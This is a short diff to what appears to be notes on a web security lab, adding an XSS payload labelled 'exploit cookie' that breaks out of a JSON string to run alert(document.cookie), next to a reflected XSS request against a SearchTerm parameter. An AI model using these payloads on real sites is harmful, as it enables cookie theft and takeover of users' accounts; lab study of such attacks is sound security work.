@@ -1,3 +1,8 @@
+## exploit cookie
+xss","test":alert(window["document"]["cookie"])}//
+
+-----------------------------------------------------------------------------------------------------------
+
 ## Stage 1: Access any user account.
 ```
 GET /?SearchTerm=%22-alert%281%29-%22 HTTP/1.1
